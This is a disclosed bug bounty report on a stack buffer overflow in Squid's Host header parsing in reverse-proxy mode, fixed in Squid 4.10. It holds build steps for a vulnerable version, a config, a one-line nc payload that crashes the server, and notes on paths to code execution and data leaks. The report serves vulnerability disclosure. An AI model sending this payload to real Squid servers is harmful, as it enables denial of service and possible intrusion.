# Squid as reverse proxy RCE and data leak

## Report Details
- **Report ID**: 778610
- **URL**: https://hackerone.com/reports/778610
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-01-20T21:46:26.550Z
- **Disclosed**: 2021-08-26T23:10:11.757Z

## Reporter
- **Username**: guido
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
## Summary:
This was a very difficult experience as Squid maintainers took a long time to answer. I tried getting help from HackerOne support, Dropbox support and the Internet Bug Bounty (never e-mailed me back) to no avail. What could have taken a few days took months.

The vulnerability concerns a stack buffer overflow (write) in parsing of the Host header if Squid acts as a reverse proxy.

The bug is fixed in Squid 4.10 released on 20 Jan 2020 which can be found here: http://www.squid-cache.org/Versions/v4/

## Steps To Reproduce:
```
mkdir squid-poc
cd squid-poc/
wget 'https://github.com/squid-cache/squid/archive/SQUID_4_8.tar.gz'
tar zxf SQUID_4_8.tar.gz
mkdir squid-install
cd squid-SQUID_4_8/
autoreconf -if
./configure --prefix=$(realpath ../squid-install)
make -j$(nproc)
make install
cd ../squid-install/sbin/
```

Create a file ```squid.conf``` with this contents. This is based on the instructions at https://wiki.squid-cache.org/ConfigExamples/Reverse/BasicAccelerator

```
http_port 9999 accel defaultsite=127.0.0.1 vhost vport=1
cache_peer 127.0.0.1 parent 80 0 no-query originserver name=myAccel
acl our_sites dstdomain your.main.website.name
http_access allow our_sites
cache_peer_access myAccel allow our_sites
cache_peer_access myAccel deny all
```

Run Squid:

The following is a oneliner to launch Squid and send the payload that crashes it:

```
./squid -N -f squid.conf & sleep 1 && echo -en "GET / HTTP/1.1\x0D\x0AHost: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:\x0D\x0A\x0D\x0A" | nc localhost 9999
```

Output:

```
[1] 19871
*** buffer overflow detected ***: ./squid terminated
[1]+  Aborted                 (core dumped) ./squid -N -f squid.conf
```

## Supporting Material/References:

Exploitation with -fstack-protector enabled is impossible.
Some compilers don't enable -fstack-protector by default (like Clang without optimization flags).

Without stack protector, exploitation is relatively easy on 32 bit as valid addresses normally don't require a leading zero byte (which cannot be written by the payload, because the affected code treats it as a null-terminated string).
On 64 bit it is more difficult, but not necessarily impossible. Rather than overwriting the return address, changing the value of a (for instance boolean) configuration variable may be used.

Unlike glibc, musl libc is used does not write a NULL byte to the destination buffer if the size argument is very large, which happens here due to an overflowing subtraction. Hence, exploitation may be easier on systems that use musl libc, like OpenWRT and Alpine Linux.

There is also a small data leak for payloads of a particular length. This does not crash Squid, and makes it return uninitialized bytes located after the string buffer, usually just several (until a NULL byte is reached).

Fix: https://github.com/squid-cache/squid/pull/519

## Impact

Remote code execution (under certain circumstances), crashing a server (under most circumstances), leaking data from the server (under most circumstances).

## Attachments
No attachments
